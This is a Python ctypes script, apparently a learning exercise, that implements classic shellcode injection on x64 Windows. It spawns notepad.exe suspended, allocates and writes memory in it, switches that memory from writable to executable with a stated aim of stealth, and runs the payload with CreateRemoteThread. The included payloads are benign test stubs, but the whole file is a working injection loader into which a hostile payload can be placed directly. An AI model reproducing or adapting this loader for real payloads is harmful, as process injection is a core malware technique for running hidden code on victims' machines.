"""
(prod) Shellcode injection into notepad.exe
- x64 process on x64 systems

Payloads shellcode:
    - simple shellcodes to test/prove functionality
    - expected GetExitCodeThread() return code detailed

Steps:
------
- Create SUSPENDED process                     -> CreateProcessW()
- Allocate memory                              -> VirtualAllocEx()
- Write payload into allocated memory          -> WriteProcessMemory()
- Confirm payload written correctly            -> ReadProcessMemory()
- Create a new thread, and execute payload     -> CreateRemoteThread()
- Resume original thread                       -> ResumeThread()
"""


import ctypes
from ctypes import wintypes
import msvcrt


kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)




# ----------------------------------
# Payloads
# ----------------------------------

# Deterministic, return 0 from RAX
# - GetExitcodethread() == 0
#
payload = b"\x48\x31\xC0\xC3"       # xor rax, rax; ret

# Infinite loop, thread will sit at 100% CPU usage for one core.
# - resuming notepad.exe causes crash (expected)
# - GetExitCodeThread() == 259
#
#payload = b"\xEB\xFE"       # jmp short -2




# ----------------------------------
# CONSTANTS
# ----------------------------------

# for CreateProcessW() - samples
CREATE_NEW_CONSOLE  = 0x10
CREATE_NO_WINDOW    = 0x08000000
DETACHED_PROCESS    = 0x08
CREATE_SUSPENDED    = 0x04


# for IsWow64Process2()
IMAGE_FILE_MACHINE_UNKNOWN  = 0x0
IMAGE_FILE_MACHINE_I386     = 0x014c    # x86
IMAGE_FILE_MACHINE_AMD64    = 0x8664    # x64


# for SuspendThread() / ResumeThread()
INVALID_DWORD = 0xFFFFFFFF


# for VirtualAllocEx() / VirtualProtectEx ()
MEM_COMMIT      = 0x1000
MEM_RESERVE     = 0x2000
PAGE_NOACCESS   = 0x01
PAGE_READONLY   = 0x02
PAGE_READWRITE  = 0x04
PAGE_WRITECOPY  = 0x08
PAGE_EXECUTE            = 0x10
PAGE_EXECUTE_READ       = 0x20
PAGE_EXECUTE_READWRITE  = 0x40
PAGE_EXECUTE_WRITECOPY  = 0x80


# for VirtualFreeEx()
MEM_DECOMMIT    = 0x4000
MEM_RELEASE     = 0x8000
MEM_COALESCE_PLACEHOLDERS   = 0x01
MEM_PRESERVE_PLACEHOLDER    = 0x02


# for WaitForSingleObject()
WAIT_OBJECT_0   = 0x000
WAIT_ABANDONED  = 0x080
WAIT_TIMEOUT    = 0x102
WAIT_FAILED     = 0xFFFFFFFF




# ----------------------------------
# Struct Definitions
# ----------------------------------

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength",                 wintypes.DWORD),
        ("lpSecurityDescriptor",    wintypes.LPVOID),
        ("bInheritHandle",          wintypes.BOOL),
    ]

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",                wintypes.DWORD),
        ("lpReserved",        wintypes.LPWSTR),
        ("lpDesktop",         wintypes.LPWSTR),
        ("lpTitle",           wintypes.LPWSTR),
        ("dwX",               wintypes.DWORD),
        ("dwY",               wintypes.DWORD),
        ("dwXSize",           wintypes.DWORD),
        ("dwYSize",           wintypes.DWORD),
        ("dwXCountChars",     wintypes.DWORD),
        ("dwYCountChars",     wintypes.DWORD),
        ("dwFillAttribute",   wintypes.DWORD),
        ("dwFlags",           wintypes.DWORD),
        ("wShowWindow",       wintypes.WORD),
        ("cbReserved2",       wintypes.WORD),
        ("lpReserved2",       wintypes.LPBYTE),
        ("hStdInput",         wintypes.HANDLE),
        ("hStdOutput",        wintypes.HANDLE),
        ("hStdError",         wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    wintypes.HANDLE),
        ("hThread",     wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId",  wintypes.DWORD),    
    ]




# ----------------------------------
# Function Prototypes
# ----------------------------------

kernel32.CloseHandle.argtypes = [ wintypes.HANDLE, ]  # hObject
kernel32.CloseHandle.restype = wintypes.BOOL


kernel32.CreateProcessW.argtypes =[
    wintypes.LPCWSTR,                       # lpApplicationName (opt)
    wintypes.LPWSTR,                        # [i/o] lpCommandLine (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpProcessAttributes (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpThreadAttributes (opt)
    wintypes.BOOL,                          # bInheritHandles
    wintypes.DWORD,                         # dwCreationFlags
    ctypes.c_void_p,                        # lpEnvironment (opt)
    wintypes.LPCWSTR,                       # lpCurrentDirectory (opt)
    ctypes.POINTER(STARTUPINFOW),           # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION),    # [o] lpProcessInformation
]
kernel32.CreateProcessW.restype = wintypes.BOOL


kernel32.CreateRemoteThread.argtypes = [
    wintypes.HANDLE,                        # hProcess
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpThreadAttributes
    ctypes.c_size_t,                        # dwStackSize
    wintypes.LPVOID,        # lpStartAddress, ptr to thread function
    wintypes.LPVOID,        # lpParameter, arg to thread function
    wintypes.DWORD,         # dwCreationFlags, CREATE_SUSPENDED etc
    ctypes.POINTER(wintypes.DWORD), # [o] lpThreadId (opt)
]
kernel32.CreateRemoteThread.restype = wintypes.HANDLE


kernel32.GetExitCodeThread.argtypes = [
    wintypes.HANDLE,                # hThread
    ctypes.POINTER(wintypes.DWORD), # [o] lpExitCode
]
kernel32.GetExitCodeThread.restype = wintypes.BOOL


kernel32.IsWow64Process2.argtypes = [
    wintypes.HANDLE,                    # hProcess
    ctypes.POINTER(wintypes.USHORT),    # [o] pProcessMachine
    ctypes.POINTER(wintypes.USHORT),    # [o] pNativeMachine (opt)
]
kernel32.IsWow64Process2.restype = wintypes.BOOL

kernel32.ReadProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPCVOID,                   # lpBaseAddress
    wintypes.LPVOID,                    # [o] lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] lpNumberOfBytesRead
]
kernel32.ReadProcessMemory.restype = wintypes.BOOL


kernel32.ResumeThread.argtypes = [wintypes.HANDLE,]    # hThread
kernel32.ResumeThread.restype = wintypes.DWORD


kernel32.SuspendThread.argtypes = [wintypes.HANDLE,]    # hThread
kernel32.SuspendThread.restype = wintypes.DWORD


kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,        # hProcess
    wintypes.LPVOID,        # lpAddress (opt) (can be null)
    ctypes.c_size_t,        # dwSize
    wintypes.DWORD,         # flAllocationType
    wintypes.DWORD,         # flProtect
]
# kernel32.VirtualAllocEx.restype = wintypes.LPVOID
kernel32.VirtualAllocEx.restype = ctypes.c_void_p


kernel32.VirtualFreeEx.argtypes = [
    wintypes.HANDLE,    # hProcess
    wintypes.LPVOID,    # lpAddress, ptr to starting address of memory to free
    ctypes.c_size_t,    # dwSize, (set 0 if MEM_RELEASE)
    wintypes.DWORD,     # dwFreeType (see CONSTANTS)
]
kernel32.VirtualFreeEx.restype = wintypes.BOOL


kernel32.VirtualProtectEx.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpAddress
    ctypes.c_size_t,                    # dwSize
    wintypes.DWORD,                     # flNewProtect (see CONSTANTS)
    ctypes.POINTER(wintypes.DWORD),     # [o] lpflOldProtect
]
kernel32.VirtualProtectEx.restype = wintypes.BOOL


kernel32.WaitForSingleObject.argtypes = [
    wintypes.HANDLE,        # hHandle
    wintypes.DWORD,         # dwMilliseconds
]
kernel32.WaitForSingleObject.restype  = wintypes.DWORD


kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpBaseAddress
    wintypes.LPCVOID,                   # lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesWritten
]
kernel32.WriteProcessMemory.restype = wintypes.BOOL




# ----------------------------------
# Function Definitions
# ----------------------------------

def winerr() -> OSError:
    """ Return a ctypes.WinError() with the last Windows API error """

    return ctypes.WinError(ctypes.get_last_error())




def pause_execute_payload() -> None:
    """ Pause until user key press (any) """

    msg = "\n\n[!] WARNING: About to execute payload in new thread: Press any key to continue..."
    print(msg, end='', flush=True)
    msvcrt.getch()
    print()




def close_handle(handle: wintypes.HANDLE, name: str="Handle") -> None:
    """ Close open handles, to avoid resource leaks """

    print(f"[+] Closing Handle {handle.value} to {name}: ", end='', flush=True)

    if handle is None or handle.value == 0:
        print(f"[!] Warning: {name} is None or invalid, nothing to close")
        return

    if not kernel32.CloseHandle(handle):
        print(f"Failed! Error: {winerr()}")
    else:
        print(f"Successful")




def create_process(
    app: str=r"c:\windows\system32\notepad.exe",
    flags: int=None
) -> tuple[wintypes.HANDLE, wintypes.HANDLE,
           wintypes.DWORD, wintypes.DWORD]:

    hdr = "\n >>>>    Creating SUSPENDED Process -> CreateProcessW()    <<<<\n"
    print("\n" + "-"*len(hdr) + hdr + "-" *len(hdr))


    # define args
    lpApplicationName = app
    lpCommandLine = None
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = False
    dwCreationFlags = flags
    lpEnvironment = None
    lpCurrentDirectory = None

    lpStartupInfo = STARTUPINFOW()
    lpStartupInfo.cb = ctypes.sizeof(STARTUPINFOW)
    lpProcessInformation = PROCESS_INFORMATION()

    # spawn process
    try:
        if not kernel32.CreateProcessW(
            lpApplicationName,
            lpCommandLine,
            lpProcessAttributes, 
            lpThreadAttributes, 
            bInheritHandles, 
            dwCreationFlags, 
            lpEnvironment, 
            lpCurrentDirectory, 
            ctypes.byref(lpStartupInfo), 
            ctypes.byref(lpProcessInformation)
        ):
            raise winerr()

        print(f"-> Process created: {lpApplicationName}")
        
        # return handles/Ids to thread and process
        hThread = wintypes.HANDLE(lpProcessInformation.hThread)
        hProcess = wintypes.HANDLE(lpProcessInformation.hProcess)  
        dwThreadId = lpProcessInformation.dwThreadId
        dwProcessId = lpProcessInformation.dwProcessId
        
        return hThread, hProcess, dwThreadId, dwProcessId
        
    except OSError as e:
        raise OSError(f"\n[!] CreateProcessW() Failed, Application: {app}, Error: {e}")
'''
    finally:
        hProcess = wintypes.HANDLE(lpProcessInformation.hProcess)
        if hProcess.value != 0:
            close_handle(hProcess, "Process")

        hThread = wintypes.HANDLE(lpProcessInformation.hThread)
        if hThread.value != 0:
            close_handle(hThread, "Thread")

'''




def check_system_arch(hProcess: wintypes.HANDLE) -> None:
    """
    Check system arch, and see if process is running as native/non-emulated
    - pProcessMachine, what process is running as
    - pNativeMachine, what system actually is
    
    To confirm that payload/shellcode is suitable for system/host
    """
    
    pProcessMachine = wintypes.USHORT()
    pNativeMachine  = wintypes.USHORT()
    
    print(f"\n[+] Architecture check -> IsWow63Process2()")
    
    if not kernel32.IsWow64Process2(
            hProcess,
            ctypes.byref(pProcessMachine),
            ctypes.byref(pNativeMachine)
    ):
        raise winerr()

    ARCH_MAP = {
        IMAGE_FILE_MACHINE_UNKNOWN: "UNKNOWN",
        IMAGE_FILE_MACHINE_I386:    "x86 (32-bit)",
        IMAGE_FILE_MACHINE_AMD64:   "x64 (64-bit)",
    }

    proc_val = pProcessMachine.value
    machine_val = pNativeMachine.value
    
    proc_str = ARCH_MAP.get(proc_val, f"Unknown ({hex(proc_val)})")
    machine_str = ARCH_MAP.get(machine_val, f"Unknown ({hex(machine_val)})")
    
    is_native = (proc_val == IMAGE_FILE_MACHINE_UNKNOWN)
    
    print(f"-> Machine arch: {machine_str}")
    print(f"-> Process arch is native, not WOW64 (True/False): {is_native}")

    if proc_val != IMAGE_FILE_MACHINE_UNKNOWN:  
        raise RuntimeError("Cannot inject x64 payload into WOW64 (32-bit) process")




def thread_suspend_check(hThread: wintypes.HANDLE) -> None:

    """
    Check and display current suspend-count of thread
    - SuspendThread() INcrements count, and returns previous count (eg, n -> n+1, return n)
    - ResumeThread()  DEcrements count, and returns previous count (eg, n -> n-1, return n)
    - ResumeThread() will not resume thread execution, until suspend-count == 0
    """

    print(f"\n[+] Confirming thread state -> SuspendThread()")

    prev_count = kernel32.SuspendThread(hThread)
    if prev_count == 0xFFFFFFFF:
        raise OSError("SuspendThread() failed")
    
    # technically current count += 1, but resetting after print/call
    print(f"-> Thread suspended, current suspend count: {prev_count}")
    
    # return/reset count to before SuspendThread() call
    if kernel32.ResumeThread(hThread) == 0xFFFFFFFF:
        raise OSError("ResumeThread() Failed")




def virtual_alloc_ex(
    hProcess: wintypes.HANDLE,
    size: int
) -> wintypes.LPVOID:

    """
    Allocate memory space in suspended process
    - returns pointer to allocated memory, in remote process
    
    For "steahliness", only setting PAGE_READWRITE
    - later setting VirtualProtectEx(..., PAGE_EXECUTE_READ) once payload written
    """

    hdr = "\n>>>>    Allocating Memory -> VirtualAllocEx()    <<<<\n"
    print("\n" + "-" *len(hdr) + hdr + "-" *len(hdr))
    
    lpAddress = ctypes.c_void_p(0)
    dwSize = ctypes.c_size_t(size)

    ptr = kernel32.VirtualAllocEx(hProcess,
                            lpAddress,
                            dwSize,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_READWRITE)

    if not ptr:
        raise winerr()
    
    print(f"-> Successful, base address: {hex(ptr)}")
    
    return ptr




def write_payload(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: wintypes.LPVOID,
    lpBuffer: bytes
) -> None:

    """
    Write payload into the allocted memory of the remote process
    - hProcess -> handle to remote process
    - lpBaseAddress -> pointer to allocated memory in remote process
    - lpBuffer -> payload to write into allocated memory
    """

    print(f"\n[+] Writing payload to memory -> WriteProcessMemory()")

    bytes_written = ctypes.c_size_t()   # number of bytes written
    nSize = len(lpBuffer)

    payload_write = kernel32.WriteProcessMemory(
        hProcess,
        lpBaseAddress,
        lpBuffer,
        nSize,
        ctypes.byref(bytes_written)
    )
    
    if not payload_write:
        raise winerr()

    print(f"-> Successful, bytes written: {bytes_written.value}") 




def confirm_payload_write(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: wintypes.LPVOID,
    payload: bytes
) -> None:

    """
    Check/confirm payload written by write_payload()
    - prints bytes-written, actual payload, and checks for match
    """

    print("\n[+] Confirming payload written to memory -> ReadProcessMemory()")

    nSize = len(payload)

    lpBuffer = ctypes.create_string_buffer(nSize)
    bytes_read = ctypes.c_size_t()

    if not kernel32.ReadProcessMemory(
        hProcess,
        lpBaseAddress,
        lpBuffer,
        nSize,
        ctypes.byref(bytes_read)
    ):
        raise winerr()

    print(f"-> Bytes read: {bytes_read.value}")
    print(f"-> Payload: {lpBuffer.raw}")
    print(f"-> Confirm correct payload (True/False): {lpBuffer.raw == payload}")




def  modify_memory_protection(
    hProcess: wintypes.HANDLE,
    lpAddress: wintypes.LPVOID,
    dwSize: int,
    flNewProtect: int=PAGE_EXECUTE_READ
) -> int:

    """
    Modify memory protection setting
    - initally set to PAGE_READWRITE -> VirtualAllocEx(RW)
    - here, re-set to PAGE_EXECUTE_READ (RW -> RX) after payload written
    
    Note: after execution, re-called to reset previous setting (RX -> RW)
    """
    
    print(f"\n[+] Modifying status of memory protection -> VirtualProtectEx()")

    lpflOldProtect = wintypes.DWORD()

    if not kernel32.VirtualProtectEx(
        hProcess,
        lpAddress,
        dwSize,
        flNewProtect,
        ctypes.byref(lpflOldProtect)
    ):
        raise winerr()

    PROTECT_STATUS_MAP = {
        0x1000: "MEM_COMMIT",
        0x2000: "MEM_RESERVE", 
        0x01:   "PAGE_NOACCESS", 
        0x02:   "PAGE_READONLY",
        0x04:   "PAGE_READWRITE",
        0x08:   "PAGE_WRITECOPY",
        0x10:   "PAGE_EXECUTE",
        0x20:   "PAGE_EXECUTE_READ",
        0x40:   "PAGE_EXECUTE_READWRITE",
        0x80:   "PAGE_EXECUTE_WRITECOPY",
    }

    old_val = lpflOldProtect.value
    new_val = flNewProtect
    
    old = PROTECT_STATUS_MAP.get(old_val, f"Unknown Code: ({hex(old_val)})")
    new = PROTECT_STATUS_MAP.get(new_val, f"Unknown Code: ({hex(new_val)})")

    print(f"-> Old status: {old} ({hex(old_val)})")
    print(f"-> New status: {new} ({hex(new_val)})")

    return lpflOldProtect.value




def create_remote_thread(
    hProcess: wintypes.HANDLE,
    lpStartAddress: wintypes.LPVOID,
) -> wintypes.HANDLE:

    """
    Create a remote thread in the remote process, at lpBaseAddress
    - thread executes immediately upon creation
    - returns handle to the created remote thread
    """

    hdr = "\nCreating Remote Thread -> CreateRemoteThread()\n"
    print(f"\n\n" + "-"*len(hdr) + hdr + "-" *len(hdr))


    lpThreadAttributes = None
    dwStackSize = 0
    lpParameter = None
    dwCreationFlags = 0 # thread runs immediately after creation
    lpThreadId = wintypes.DWORD()
    
    hThread_new = kernel32.CreateRemoteThread(
        hProcess,
        lpThreadAttributes,
        dwStackSize,
        lpStartAddress,
        lpParameter,
        dwCreationFlags,
        ctypes.byref(lpThreadId)
    )

    if not hThread_new:
        raise winerr()
        
    print(f"-> Successful, newly created ThreadId: {lpThreadId.value}")

    return wintypes.HANDLE(hThread_new)




def wait_timer(hThread: wintypes.HANDLE, dwMilliseconds: int=5000) -> wintypes.DWORD:

    """
    Wait for a thread/process handle to be in signaled state
    - determine if it is safe for memory to be freed -> VirtualFreeEx()
    """

    print(f"\n[+] Checking thread synchronisation -> WaitForSingleObject()")
    wait_status = kernel32.WaitForSingleObject(hThread, dwMilliseconds)

    if wait_status == WAIT_FAILED:
        raise winerr()


    # referencing against CONSTANTS values, not using map
    if wait_status == WAIT_OBJECT_0:
        print("-> Thread signaled: completed execution")
    elif wait_status == WAIT_ABANDONED:
        print("-> !! WARNING !!  Mutex abandoned, see documentation")
    elif wait_status == WAIT_TIMEOUT:
        print("-> Timeout: thread still running")
    else:
        print(f"-> Other wait result: {wait_status}")


    return wait_status




def get_thread_exit_code(hThread: wintypes.HANDLE) -> None:

    """ 
    Retrieve termination status of given thread
    """

    print(f"\n[+] Retrieving thread termination status -> GetExitCodeThread()")
    
    exit_code = wintypes.DWORD()
    if not kernel32.GetExitCodeThread(hThread, ctypes.byref(exit_code)):
        raise winerr()


    EXIT_CODE_MAP = {
        0: "SUCCESS",
        1: "TERMINATED_MANUALLY",
        259: "STILL_RUNNING",
    }

    result = EXIT_CODE_MAP.get(exit_code.value, f"Unknown Code: ({exit_code})")
    print(f"-> Remote thread exit code: {result} ({exit_code.value})")





def resume_orig_process(
    hThread: wintypes.HANDLE,
    dwThreadId: wintypes.DWORD,
    dwProcessId: wintypes.DWORD
) -> None:
    
    """
    Resume execution of original process/thread
    """

    print(f"\n[+] Resuming original thread:")
    print(f"-> ProcessId: {dwProcessId}")
    print(f"-> ThreadId: {dwThreadId}")
    
    kernel32.ResumeThread(hThread)




def free_allocated_memory(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: wintypes.LPVOID,
    dwSize=0,
    dwFreeType=MEM_RELEASE,
    wait_status: int=None
) -> wintypes.BOOL:
    
    """ Free/clear up memory previously allocated with VirtualAllocEx() """
    
    print(f"\n[+] Attempting to free memory -> VirtualFreeEx()")
    
    
    if wait_status == WAIT_FAILED:
        raise winerr()
    
    if wait_status == WAIT_OBJECT_0:
        if not kernel32.VirtualFreeEx(hProcess, lpBaseAddress, dwSize, dwFreeType):
            raise winerr()
        print(f"-> Successful, memory freed at: {hex(lpBaseAddress)}")
        return True

    elif wait_status == WAIT_TIMEOUT:
        print(f"-> Thread still running - skipping free to avoid crash. Status: {wait_status}")
        return False
    else:
        print(f"-> Unsuccessful, unable to release memory. Status: {wait_status}")
        return False




##########################################
##### Main functionality starts here #####
##########################################

# ----------------------------------
# Create Suspended Process (notepad.exe)
# ----------------------------------
# create process, return handle/Ids to thread/process
hThread, hProcess, dwThreadId, dwProcessId = create_process(flags=CREATE_SUSPENDED)

# check if process is 64-bit/native, and not WOW64
check_system_arch(hProcess)

# check suspend state of thread
thread_suspend_check(hThread)




# ----------------------------------
# Allocate memory, and write payload
# ----------------------------------
# allocate memory (RW) <- ptr to base address of memory
lpBaseAddress = virtual_alloc_ex(hProcess, len(payload))

# write payload into allocated memory
write_payload(hProcess, lpBaseAddress, payload)

# confirm payload write
confirm_payload_write(hProcess, lpBaseAddress, payload)

# modify memory protection setting (RW -> RX)
old_mem_protect = modify_memory_protection(hProcess, lpBaseAddress, len(payload))

# confirm execution of payload
pause_execute_payload()




# ----------------------------------
# Execute injected payload, validate execution
# ----------------------------------
# create/execute remote thread
hThread_new = create_remote_thread(hProcess, lpStartAddress=lpBaseAddress)



# pause/wait
wait_status = wait_timer(hThread_new, 5000)

# check exit-code of thread execution
get_thread_exit_code(hThread_new)




# ----------------------------------
# Clean-up
# ----------------------------------
hdr = "\n>>>>    Cleaning up    <<<<\n"
print("\n" + "-" *len(hdr) + hdr + "-" *len(hdr))

# reset memory protection setting (RX -> RW)
print(f"[!] Resetting back to previous Memory Protection setting...")
modify_memory_protection(hProcess, lpBaseAddress, len(payload), old_mem_protect)

# attempt to free-up allocated memory
free_allocated_memory(hProcess, lpBaseAddress, wait_status = wait_status)

# resume execution of original thread/process
resume_orig_process(hThread, dwThreadId, dwProcessId)

# close all handles
print()
close_handle(hThread_new, "Remote Payload Thread")
close_handle(hThread, "Notepad Thread")
close_handle(hProcess, "Notepad Process")
